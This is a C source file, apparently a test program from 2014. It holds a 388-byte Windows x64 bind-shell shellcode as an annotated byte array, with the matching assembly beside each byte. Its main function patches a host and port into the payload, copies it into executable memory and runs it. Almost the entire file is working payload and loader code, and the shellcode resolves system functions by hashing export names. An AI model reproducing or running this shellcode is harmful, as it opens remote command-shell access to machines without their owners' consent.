
#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

//
// 387 bytes bind shell for windows 64 using ipv4
//
// cl bind_overlap64_test.cpp
//

/* Copyright (c) 2014 Kevin Devine */
/* Size = 388 bytes */

char bind_overlap64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                                 */
  /* 0001 */  "\x56"                          /*  push rsi                                 */
  /* 0002 */  "\x57"                          /*  push rdi                                 */
  /* 0003 */  "\x55"                          /*  push rbp                                 */
  /* 0004 */  "\x41\x54"                      /*  push r12                                 */
  /* 0006 */  "\x41\x55"                      /*  push r13                                 */
  /* 0008 */  "\x41\x56"                      /*  push r14                                 */
  /* 000A */  "\x41\x57"                      /*  push r15                                 */
  /* 000C */  "\x4C\x8B\xFC"                  /*  mov r15, rsp                             */
  /* 000F */  "\x48\x83\xE4\xF0"              /*  and rsp, FFFFFFFFFFFFFFF0h               */
  /* 0013 */  "\x48\x83\xEC\x78"              /*  sub rsp, 78h                             */
  /* 0017 */  "\xF9"                          /*  stc                                      */
  /* 0018 */  "\xEB\x71"                      /*  jmp 0000008Bh                            */
  /* 001A */  "\x5E"                          /*  pop rsi                                  */
  /* 001B */  "\x48\x8D\x6E\x30"              /*  lea rbp, qword ptr [rsi+30h]             */
  /* 001F */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0021 */  "\x99"                          /*  cdq                                      */
  /* 0022 */  "\xB2\xE8"                      /*  mov dl, E8h                              */
  /* 0024 */  "\x48\x2B\xE2"                  /*  sub rsp, rdx                             */
  /* 0027 */  "\x8B\xCA"                      /*  mov ecx, edx                             */
  /* 0029 */  "\x48\x8B\xFC"                  /*  mov rdi, rsp                             */
  /* 002C */  "\xF3\xAA"                      /*  rep stosb                                */
  /* 002E */  "\xB8\x9C\x92\x9B\xFF"          /*  mov eax, FF9B929Ch                       */
  /* 0033 */  "\xF7\xD0"                      /*  not eax                                  */
  /* 0035 */  "\x48\x8D\x7C\x24\x50"          /*  lea rdi, qword ptr [rsp+50h]             */
  /* 003A */  "\x4C\x8B\xE7"                  /*  mov r12, rdi                             */
  /* 003D */  "\x48\xAB"                      /*  stosq                                    */
  /* 003F */  "\x4C\x8B\xEF"                  /*  mov r13, rdi                             */
  /* 0042 */  "\x48\xAD"                      /*  lodsq                                    */
  /* 0044 */  "\x48\xF7\xD0"                  /*  not rax                                  */
  /* 0047 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0049 */  "\x48\xAF"                      /*  scasq                                    */
  /* 004B */  "\x4C\x8B\xF7"                  /*  mov r14, rdi                             */
  /* 004E */  "\x6A\x68"                      /*  push 00000068h                           */
  /* 0050 */  "\x58"                          /*  pop rax                                  */
  /* 0051 */  "\xAB"                          /*  stosd                                    */
  /* 0052 */  "\x41\xFF\x46\x3D"              /*  inc dword ptr [r14+3Dh]                  */
  /* 0056 */  "\x4C\x89\x74\x24\x40"          /*  mov qword ptr [rsp+40h], r14             */
  /* 005B */  "\x49\x8D\x7E\x50"              /*  lea rdi, qword ptr [r14+50h]             */
  /* 005F */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0062 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0065 */  "\xB2\x01"                      /*  mov dl, 01h                              */
  /* 0067 */  "\xB1\x02"                      /*  mov cl, 02h                              */
  /* 0069 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 006B */  "\x93"                          /*  xchg eax, ebx                            */
  /* 006C */  "\x6A\x10"                      /*  push 00000010h                           */
  /* 006E */  "\x41\x58"                      /*  pop r8                                   */
  /* 0070 */  "\x49\x8B\xD5"                  /*  mov rdx, r13                             */
  /* 0073 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0075 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0077 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 007A */  "\x92"                          /*  xchg eax, edx                            */
  /* 007B */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 007D */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 007F */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0082 */  "\x92"                          /*  xchg eax, edx                            */
  /* 0083 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0085 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0087 */  "\x4C\x8B\xF0"                  /*  mov r14, rax                             */
  /* 008A */  "\xF8"                          /*  clc                                      */
  /* 008B */  "\x72\x4A"                      /*  jc 000000D7h                             */
  /* 008D */  "\x48\xAB"                      /*  stosq                                    */
  /* 008F */  "\x48\xAB"                      /*  stosq                                    */
  /* 0091 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0093 */  "\x48\xAF"                      /*  scasq                                    */
  /* 0095 */  "\x48\x89\x7C\x24\x48"          /*  mov qword ptr [rsp+48h], rdi             */
  /* 009A */  "\xFF\x44\x24\x20"              /*  inc dword ptr [rsp+20h]                  */
  /* 009E */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 00A1 */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 00A4 */  "\x49\x8B\xD4"                  /*  mov rdx, r12                             */
  /* 00A7 */  "\x33\xC9"                      /*  xor ecx, ecx                             */
  /* 00A9 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00AB */  "\x83\xCA\xFF"                  /*  or edx, FFFFFFFFh                        */
  /* 00AE */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00B1 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00B3 */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00B6 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00B8 */  "\x48\x8B\x4F\x08"              /*  mov rcx, qword ptr [rdi+08h]             */
  /* 00BC */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00BE */  "\x49\x8B\xCE"                  /*  mov rcx, r14                             */
  /* 00C1 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00C3 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 00C5 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00C7 */  "\x49\x8B\xE7"                  /*  mov rsp, r15                             */
  /* 00CA */  "\x41\x5F"                      /*  pop r15                                  */
  /* 00CC */  "\x41\x5E"                      /*  pop r14                                  */
  /* 00CE */  "\x41\x5D"                      /*  pop r13                                  */
  /* 00D0 */  "\x41\x5C"                      /*  pop r12                                  */
  /* 00D2 */  "\x5D"                          /*  pop rbp                                  */
  /* 00D3 */  "\x5F"                          /*  pop rdi                                  */
  /* 00D4 */  "\x5E"                          /*  pop rsi                                  */
  /* 00D5 */  "\x5B"                          /*  pop rbx                                  */
  /* 00D6 */  "\xC3"                          /*  ret                                      */
  /* 00D7 */  "\xE8\x3E\xFF\xFF\xFF"          /*  call 0000001Ah                           */
  /* 00DC */  "\x00\x00\x00\x00"
  /* 00E0 */  "\x00\x00\x00\x00"
  /* 00E4 */  "\xB2\xA5\xC1\x87"
  /* 00E8 */  "\x1C\xB1\x14\xCB"
  /* 00EC */  "\xEE\xAD\xFD\x8A"
  /* 00F0 */  "\x3C\x2C\x96\x9A"
  /* 00F4 */  "\xFE\xDF\x72\x17"
  /* 00F8 */  "\x4B\xDA\x38\x53"
  /* 00FC */  "\x35\xC9\x1E\x7F"
  /* 0100 */  "\x35\xC9\x1E\x7F"
  /* 0104 */  "\x6E\xED\xCD\xA2"
  /* 0108 */  "\x6E\xED\xCD\xA2"
  /* 010C */  "\xAD"                          /*  lodsd                                    */
  /* 010D */  "\x50"                          /*  push rax                                 */
  /* 010E */  "\x51"                          /*  push rcx                                 */
  /* 010F */  "\x52"                          /*  push rdx                                 */
  /* 0110 */  "\x53"                          /*  push rbx                                 */
  /* 0111 */  "\x55"                          /*  push rbp                                 */
  /* 0112 */  "\x56"                          /*  push rsi                                 */
  /* 0113 */  "\x57"                          /*  push rdi                                 */
  /* 0114 */  "\x6A\x60"                      /*  push 00000060h                           */
  /* 0116 */  "\x5E"                          /*  pop rsi                                  */
  /* 0117 */  "\x65\x48\xAD"                  /*  lodsq                                    */
  /* 011A */  "\x48\x8B\x40\x18"              /*  mov rax, qword ptr [rax+18h]             */
  /* 011E */  "\x4C\x8B\x50\x30"              /*  mov r10, qword ptr [rax+30h]             */
  /* 0122 */  "\x49\x8B\x6A\x10"              /*  mov rbp, qword ptr [r10+10h]             */
  /* 0126 */  "\x4D\x8B\x12"                  /*  mov r10, qword ptr [r10]                 */
  /* 0129 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]             */
  /* 012C */  "\x83\xC0\x10"                  /*  add eax, 10h                             */
  /* 012F */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [rax+rbp+78h]         */
  /* 0133 */  "\x48\x8D\x74\x28\x18"          /*  lea rsi, qword ptr [rax+rbp+18h]         */
  /* 0138 */  "\xAD"                          /*  lodsd                                    */
  /* 0139 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 013A */  "\x67\xE3\xE5"                  /*  jecxz 00000122h                          */
  /* 013D */  "\xAD"                          /*  lodsd                                    */
  /* 013E */  "\x4C\x8D\x1C\x28"              /*  lea r11, qword ptr [rax+rbp]             */
  /* 0142 */  "\xAD"                          /*  lodsd                                    */
  /* 0143 */  "\x48\x8D\x3C\x28"              /*  lea rdi, qword ptr [rax+rbp]             */
  /* 0147 */  "\xAD"                          /*  lodsd                                    */
  /* 0148 */  "\x48\x8D\x1C\x28"              /*  lea rbx, qword ptr [rax+rbp]             */
  /* 014C */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [rdi+rcx*4-04h]       */
  /* 0150 */  "\x48\x03\xF5"                  /*  add rsi, rbp                             */
  /* 0153 */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0155 */  "\x99"                          /*  cdq                                      */
  /* 0156 */  "\xAC"                          /*  lodsb                                    */
  /* 0157 */  "\x03\xD0"                      /*  add edx, eax                             */
  /* 0159 */  "\xC1\xC2\x07"                  /*  rol edx, 07h                             */
  /* 015C */  "\x33\xD0"                      /*  xor edx, eax                             */
  /* 015E */  "\xFF\xC8"                      /*  dec eax                                  */
  /* 0160 */  "\x79\xF4"                      /*  jns 00000156h                            */
  /* 0162 */  "\x48\x3B\x54\x24\x30"          /*  cmp rdx, qword ptr [rsp+30h]             */
  /* 0167 */  "\xE0\xE3"                      /*  loopne 0000014Ch                         */
  /* 0169 */  "\x75\xB7"                      /*  jne 00000122h                            */
  /* 016B */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [rbx+rcx*2]          */
  /* 016F */  "\x41\x8B\x04\x93"              /*  mov eax, dword ptr [r11+rdx*4]           */
  /* 0173 */  "\x48\x03\xE8"                  /*  add rbp, rax                             */
  /* 0176 */  "\x48\x89\x6C\x24\x30"          /*  mov qword ptr [rsp+30h], rbp             */
  /* 017B */  "\x5F"                          /*  pop rdi                                  */
  /* 017C */  "\x5E"                          /*  pop rsi                                  */
  /* 017D */  "\x5D"                          /*  pop rbp                                  */
  /* 017E */  "\x5B"                          /*  pop rbx                                  */
  /* 017F */  "\x5A"                          /*  pop rdx                                  */
  /* 0180 */  "\x59"                          /*  pop rcx                                  */
  /* 0181 */  "\x58"                          /*  pop rax                                  */
  /* 0182 */  "\xFF\xE0"                      /*  jmp rax                                  */
};

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
in_addr_t resolve (char host[]) {
  struct      hostent *hp;
  in_addr_t   host_ip = 0;

  host_ip = inet_addr (host);
  
  if (host_ip == INADDR_NONE) {
    hp = gethostbyname (host);
    if (hp != NULL) {
      host_ip = *(in_addr_t *)hp->h_addr;
    }
  }
  return host_ip;
}

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 3) {
    printf ("\nUsage: bind_overlap64_test <host> <port>");
    printf ("\nExample: bind_overlap64_test localhost 80\n");
    return 0;
  }
  
  // required for shellcode to run
  WSADATA wsa;
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  sockaddr_in *p = (sockaddr_in*)&bind_overlap64[0xdc];
  in_addr_t ip = ~resolve (argv[1]);
  
  memcpy (&p->sin_addr, &ip, sizeof (ip));
  p->sin_port   = ~htons (atoi(argv[2]));
  p->sin_family = ~AF_INET;
  
  void *exec = VirtualAlloc(0, strlen (bind_overlap64), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, bind_overlap64, strlen (bind_overlap64));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  WSACleanup();
  return 0;
}

